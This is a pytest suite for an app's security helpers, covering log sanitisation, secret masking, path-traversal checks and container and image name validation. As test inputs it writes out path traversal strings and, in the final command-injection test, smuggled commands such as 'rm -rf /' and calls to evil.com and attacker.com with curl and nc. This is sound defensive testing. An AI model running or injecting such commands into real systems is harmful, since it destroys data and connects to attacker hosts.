"""Tests for security utilities (app/utils/security.py).

Tests security and input validation utilities:
- Log injection prevention
- Sensitive data masking
- Path traversal prevention
- Filename validation
- Container/image name validation
"""

from pathlib import Path

import pytest

from app.utils.security import (
    is_safe_filename,
    mask_sensitive,
    sanitize_log_message,
    sanitize_path,
    validate_container_name,
    validate_image_name,
)


class TestSanitizeLogMessage:
    """Test suite for sanitize_log_message() function."""

    def test_removes_newlines(self):
        """Test removes newline characters."""
        assert sanitize_log_message("Line1\nLine2") == "Line1Line2"
        assert sanitize_log_message("Line1\r\nLine2") == "Line1Line2"
        assert sanitize_log_message("Line1\rLine2") == "Line1Line2"

    def test_removes_tabs(self):
        """Test removes tab characters."""
        assert sanitize_log_message("Word1\tWord2") == "Word1Word2"

    def test_removes_control_characters(self):
        """Test removes ASCII control characters (0x00-0x1f)."""
        # Null byte
        assert sanitize_log_message("Text\x00Here") == "TextHere"
        # Bell character
        assert sanitize_log_message("Alert\x07Here") == "AlertHere"
        # Escape character
        assert sanitize_log_message("Esc\x1bHere") == "EscHere"

    def test_removes_delete_and_high_control_chars(self):
        """Test removes delete and high control characters (0x7f-0x9f)."""
        assert sanitize_log_message("Text\x7fHere") == "TextHere"
        assert sanitize_log_message("Text\x9fHere") == "TextHere"

    def test_preserves_normal_text(self):
        """Test preserves normal alphanumeric text."""
        assert sanitize_log_message("Hello World") == "Hello World"
        assert sanitize_log_message("123 Test ABC") == "123 Test ABC"

    def test_preserves_special_characters(self):
        """Test preserves allowed special characters."""
        assert sanitize_log_message("Test: @#$%^&*()") == "Test: @#$%^&*()"
        assert sanitize_log_message("Path/to/file.txt") == "Path/to/file.txt"

    def test_handles_none_input(self):
        """Test handles None input gracefully."""
        assert sanitize_log_message(None) == ""

    def test_converts_int_to_string(self):
        """Test converts integer to string."""
        assert sanitize_log_message(12345) == "12345"
        assert sanitize_log_message(0) == "0"

    def test_converts_float_to_string(self):
        """Test converts float to string."""
        assert sanitize_log_message(3.14) == "3.14"

    def test_converts_bytes_to_string(self):
        """Test converts bytes to string."""
        assert sanitize_log_message(b"Hello") == "b'Hello'"

    def test_prevents_log_injection(self):
        """Test prevents log injection attack."""
        malicious = "User login successful\nUser: admin\nPassword: secret"
        sanitized = sanitize_log_message(malicious)
        assert "\n" not in sanitized
        assert sanitized == "User login successfulUser: adminPassword: secret"

    def test_prevents_log_forging(self):
        """Test prevents log entry forging."""
        # Attacker tries to inject fake log entries
        malicious = "Normal log\n[ERROR] Fake error injected\n[INFO] Fake info"
        sanitized = sanitize_log_message(malicious)
        assert "\n" not in sanitized

    def test_handles_empty_string(self):
        """Test handles empty string."""
        assert sanitize_log_message("") == ""

    def test_handles_unicode(self):
        """Test preserves Unicode characters."""
        assert sanitize_log_message("Hello 世界 🌍") == "Hello 世界 🌍"


class TestMaskSensitive:
    """Test suite for mask_sensitive() function."""

    def test_masks_api_key(self):
        """Test masks API key showing last 4 chars."""
        assert mask_sensitive("tok_example_1234567890abcdef") == "***cdef"

    def test_masks_password(self):
        """Test masks password."""
        assert mask_sensitive("SuperSecret123!", visible_chars=3) == "***23!"

    def test_masks_short_value_completely(self):
        """Test masks value completely when shorter than visible_chars."""
        assert mask_sensitive("abc", visible_chars=4) == "***"
        assert mask_sensitive("1234", visible_chars=5) == "***"

    def test_masks_equal_length_value(self):
        """Test masks value equal to visible_chars."""
        assert mask_sensitive("1234", visible_chars=4) == "***"

    def test_handles_empty_string(self):
        """Test handles empty string."""
        assert mask_sensitive("") == "***"

    def test_handles_none(self):
        """Test handles None value."""
        assert mask_sensitive(None) == "***"

    def test_custom_visible_chars(self):
        """Test custom number of visible characters."""
        assert mask_sensitive("1234567890", visible_chars=2) == "***90"
        assert mask_sensitive("1234567890", visible_chars=6) == "***567890"

    def test_custom_mask_character(self):
        """Test custom mask character."""
        assert (
            mask_sensitive("tok_example_1234567890abcdef", visible_chars=4, mask_char="X")
            == "XXXcdef"
        )
        assert mask_sensitive("password", visible_chars=3, mask_char="#") == "###ord"

    def test_never_shows_beginning(self):
        """Test never shows beginning of secrets (highest entropy)."""
        result = mask_sensitive("tok_example_very_secret_key_12345")
        assert not result.startswith("tok_example")
        assert result.endswith("2345")

    def test_safe_for_logging(self):
        """Test output is safe for logging."""
        sensitive_values = [
            "ghp_1234567890abcdefghij",  # GitHub token
            "xoxb-1234567890-abcdef",  # Slack token
            "AIzaSyABC123_xyz",  # Google API key
        ]
        for value in sensitive_values:
            masked = mask_sensitive(value)
            assert masked.startswith("***")
            assert len(masked) <= len(value)


class TestSanitizePath:
    """Test suite for sanitize_path() function."""

    def test_allows_path_within_base_dir(self, tmp_path):
        """Test allows valid path within base directory."""
        (tmp_path / "data").mkdir()
        (tmp_path / "data" / "file.txt").write_text("content")

        result = sanitize_path("data/file.txt", tmp_path)

        assert result == tmp_path / "data" / "file.txt"

    def test_resolves_relative_path(self, tmp_path):
        """Test resolves relative path correctly."""
        (tmp_path / "subdir").mkdir()

        result = sanitize_path("subdir", tmp_path)

        assert result == tmp_path / "subdir"

    def test_rejects_path_traversal_with_dotdot(self, tmp_path):
        """Test rejects path traversal using .."""
        with pytest.raises(ValueError, match="Path traversal detected"):
            sanitize_path("../../etc/passwd", tmp_path)

    def test_rejects_absolute_path_outside_base(self, tmp_path):
        """Test rejects absolute path outside base directory."""
        with pytest.raises(ValueError, match="Path traversal detected"):
            sanitize_path("/etc/passwd", tmp_path)

    def test_rejects_symlink_when_disallowed(self, tmp_path):
        """Test rejects symbolic links when allow_symlinks=False."""
        target = tmp_path / "target.txt"
        target.write_text("content")

        symlink = tmp_path / "link.txt"
        symlink.symlink_to(target)

        with pytest.raises(ValueError, match="Symbolic links not allowed"):
            sanitize_path("link.txt", tmp_path, allow_symlinks=False)

    def test_allows_symlink_when_enabled(self, tmp_path):
        """Test allows symbolic links when allow_symlinks=True."""
        target = tmp_path / "target.txt"
        target.write_text("content")

        symlink = tmp_path / "link.txt"
        symlink.symlink_to(target)

        result = sanitize_path("link.txt", tmp_path, allow_symlinks=True)

        # Result is the resolved target path
        assert result == target.resolve()

    def test_raises_on_nonexistent_base_dir(self, tmp_path):
        """Test raises FileNotFoundError when base_dir doesn't exist."""
        with pytest.raises(FileNotFoundError, match="Base directory does not exist"):
            sanitize_path("file.txt", tmp_path / "nonexistent")

    def test_handles_path_object_input(self, tmp_path):
        """Test handles Path object as input."""
        (tmp_path / "file.txt").write_text("content")

        result = sanitize_path(Path("file.txt"), tmp_path)

        assert result == tmp_path / "file.txt"

    def test_prevents_path_traversal_with_encoded_dots(self, tmp_path):
        """Test prevents path traversal with URL-encoded dots."""
        # Note: Path.resolve() will normalize these, but they still resolve outside base
        with pytest.raises(ValueError, match="Path traversal"):
            sanitize_path("data/../../etc/passwd", tmp_path)

    def test_handles_nonexistent_target_path(self, tmp_path):
        """Test handles target path that doesn't exist yet (for creation)."""
        # Should succeed even if file doesn't exist yet
        result = sanitize_path("newfile.txt", tmp_path)

        assert result == tmp_path / "newfile.txt"


class TestIsSafeFilename:
    """Test suite for is_safe_filename() function."""

    def test_allows_simple_filename(self):
        """Test allows simple alphanumeric filename."""
        assert is_safe_filename("document.pdf") is True
        assert is_safe_filename("file123.txt") is True

    def test_allows_filename_with_extension(self):
        """Test allows filename with extension."""
        assert is_safe_filename("report.docx") is True
        assert is_safe_filename("image.jpg") is True

    def test_allows_hidden_file_by_default(self):
        """Test allows hidden files (starting with .) by default."""
        assert is_safe_filename(".htaccess") is True
        assert is_safe_filename(".gitignore") is True

    def test_rejects_hidden_file_when_disallowed(self):
        """Test rejects hidden files when allow_dots=False."""
        assert is_safe_filename(".htaccess", allow_dots=False) is False
        assert is_safe_filename(".config", allow_dots=False) is False

    def test_rejects_path_with_forward_slash(self):
        """Test rejects filename with forward slash (path separator)."""
        assert is_safe_filename("../../../etc/passwd") is False
        assert is_safe_filename("dir/file.txt") is False

    def test_rejects_path_with_backslash(self):
        """Test rejects filename with backslash (Windows path separator)."""
        assert is_safe_filename("dir\\file.txt") is False
        assert is_safe_filename("C:\\Windows\\System32") is False

    def test_rejects_null_byte(self):
        """Test rejects filename with null byte."""
        assert is_safe_filename("file\x00.txt") is False

    def test_rejects_control_characters(self):
        """Test rejects filename with control characters."""
        assert is_safe_filename("file\x01.txt") is False
        assert is_safe_filename("file\x1f.txt") is False
        assert is_safe_filename("file\x7f.txt") is False

    def test_rejects_empty_string(self):
        """Test rejects empty filename."""
        assert is_safe_filename("") is False

    def test_rejects_dot(self):
        """Test rejects current directory (.)."""
        assert is_safe_filename(".") is False

    def test_rejects_dotdot(self):
        """Test rejects parent directory (..)."""
        assert is_safe_filename("..") is False

    def test_allows_multiple_extensions(self):
        """Test allows filename with multiple extensions."""
        assert is_safe_filename("archive.tar.gz") is True

    def test_allows_special_characters_in_filename(self):
        """Test allows safe special characters."""
        assert is_safe_filename("file-name_v2.txt") is True
        assert is_safe_filename("report (final).pdf") is True


class TestValidateContainerName:
    """Test suite for validate_container_name() function."""

    def test_validates_simple_name(self):
        """Test validates simple alphanumeric container name."""
        assert validate_container_name("mycontainer") == "mycontainer"
        assert validate_container_name("app123") == "app123"

    def test_validates_name_with_hyphens(self):
        """Test validates container name with hyphens."""
        assert validate_container_name("my-container") == "my-container"
        assert validate_container_name("web-server-01") == "web-server-01"

    def test_validates_name_with_underscores(self):
        """Test validates container name with underscores."""
        assert validate_container_name("my_container") == "my_container"
        assert validate_container_name("app_v1_prod") == "app_v1_prod"

    def test_validates_name_with_dots(self):
        """Test validates container name with dots."""
        assert validate_container_name("my.container") == "my.container"
        assert validate_container_name("app.v1.0") == "app.v1.0"

    def test_validates_mixed_valid_chars(self):
        """Test validates container name with mixed valid characters."""
        assert validate_container_name("my-app_v1.0-prod") == "my-app_v1.0-prod"

    def test_rejects_empty_name(self):
        """Test rejects empty container name."""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_container_name("")

    def test_rejects_name_starting_with_hyphen(self):
        """Test rejects container name starting with hyphen."""
        with pytest.raises(ValueError, match="Invalid container name"):
            validate_container_name("-container")

    def test_rejects_name_starting_with_dot(self):
        """Test rejects container name starting with dot."""
        with pytest.raises(ValueError, match="Invalid container name"):
            validate_container_name(".container")

    def test_rejects_path_traversal(self):
        """Test rejects path traversal attempt."""
        with pytest.raises(ValueError, match="Invalid container name"):
            validate_container_name("../../../etc")

    def test_rejects_name_with_slash(self):
        """Test rejects container name with slash."""
        with pytest.raises(ValueError, match="Invalid container name"):
            validate_container_name("my/container")

    def test_rejects_name_with_spaces(self):
        """Test rejects container name with spaces."""
        with pytest.raises(ValueError, match="Invalid container name"):
            validate_container_name("my container")

    def test_rejects_name_with_special_chars(self):
        """Test rejects container name with invalid special characters."""
        with pytest.raises(ValueError, match="Invalid container name"):
            validate_container_name("container@host")
        with pytest.raises(ValueError, match="Invalid container name"):
            validate_container_name("my#container")


class TestValidateImageName:
    """Test suite for validate_image_name() function."""

    def test_validates_simple_image(self):
        """Test validates simple image name."""
        assert validate_image_name("nginx") == "nginx"
        assert validate_image_name("postgres") == "postgres"

    def test_validates_image_with_tag(self):
        """Test validates image name with tag."""
        assert validate_image_name("nginx:latest") == "nginx:latest"
        assert validate_image_name("postgres:14.5") == "postgres:14.5"

    def test_validates_image_with_registry(self):
        """Test validates image name with registry."""
        assert validate_image_name("docker.io/nginx:latest") == "docker.io/nginx:latest"
        assert validate_image_name("ghcr.io/user/repo:v1.0.0") == "ghcr.io/user/repo:v1.0.0"

    def test_validates_image_with_namespace(self):
        """Test validates image name with namespace."""
        assert validate_image_name("library/nginx") == "library/nginx"
        assert validate_image_name("myorg/myapp:v2") == "myorg/myapp:v2"

    def test_validates_image_with_digest(self):
        """Test validates image name with digest."""
        assert validate_image_name("nginx@sha256:abc123") == "nginx@sha256:abc123"

    def test_validates_complex_image_name(self):
        """Test validates complex image name with all components."""
        image = "registry.example.com:5000/myorg/myapp:v1.2.3-alpine"
        assert validate_image_name(image) == image

    def test_rejects_empty_image_name(self):
        """Test rejects empty image name."""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_image_name("")

    def test_rejects_path_traversal(self):
        """Test rejects path traversal in image name."""
        with pytest.raises(ValueError, match="Invalid image name"):
            validate_image_name("../../etc/passwd")

    def test_rejects_absolute_path(self):
        """Test rejects absolute path in image name."""
        with pytest.raises(ValueError, match="Invalid image name"):
            validate_image_name("/etc/passwd")

    def test_rejects_control_characters(self):
        """Test rejects image name with control characters."""
        with pytest.raises(ValueError, match="control characters"):
            validate_image_name("nginx\x00:latest")

    def test_rejects_image_starting_with_special_char(self):
        """Test rejects image name starting with special character."""
        with pytest.raises(ValueError, match="Invalid image name format"):
            validate_image_name("-nginx")
        with pytest.raises(ValueError, match="Invalid image name format"):
            validate_image_name(":nginx")

    def test_allows_underscores_in_image(self):
        """Test allows underscores in image name."""
        assert validate_image_name("my_app:latest") == "my_app:latest"

    def test_allows_hyphens_in_image(self):
        """Test allows hyphens in image name."""
        assert validate_image_name("my-app:v1-rc1") == "my-app:v1-rc1"


class TestSecurityEdgeCases:
    """Test security edge cases and attack scenarios."""

    def test_log_injection_with_ansi_escape_codes(self):
        """Test prevents ANSI escape code injection in logs."""
        malicious = "Normal log\x1b[31mRed text\x1b[0m"
        sanitized = sanitize_log_message(malicious)
        assert "\x1b" not in sanitized

    def test_null_byte_truncation_attack(self):
        """Test prevents null byte truncation in filenames."""
        # Attacker tries to hide .php after null byte
        assert is_safe_filename("innocent.txt\x00.php") is False

    def test_path_traversal_multiple_levels(self):
        """Test prevents deep path traversal."""
        malicious_paths = [
            "../../../../../../../etc/passwd",
            "../../../../../../../../../../etc/passwd",
            "data/../../../etc/passwd",
        ]
        tmp = Path("/tmp/test_base")
        if not tmp.exists():
            tmp.mkdir(parents=True)

        try:
            for path in malicious_paths:
                with pytest.raises(ValueError, match="Path traversal"):
                    sanitize_path(path, tmp)
        finally:
            if tmp.exists():
                tmp.rmdir()

    def test_unicode_normalization_attack(self):
        """Test handles Unicode normalization (directory traversal variants)."""
        # Some filesystems normalize Unicode, which can bypass filters
        # These should still be caught by path validation
        tmp = Path("/tmp/test_base")
        if not tmp.exists():
            tmp.mkdir(parents=True)

        try:
            # Unicode representation of ..
            with pytest.raises(ValueError):
                sanitize_path("\u002e\u002e/etc/passwd", tmp)
        finally:
            if tmp.exists():
                tmp.rmdir()

    def test_windows_path_separator_in_container_name(self):
        """Test rejects Windows path separator in container name."""
        with pytest.raises(ValueError):
            validate_container_name("C:\\Users\\Admin")

    def test_command_injection_in_image_name(self):
        """Test prevents command injection in image name."""
        malicious_images = [
            "nginx; rm -rf /",
            "nginx && curl evil.com",
            "nginx | nc attacker.com",
        ]
        for image in malicious_images:
            with pytest.raises(ValueError):
                validate_image_name(image)
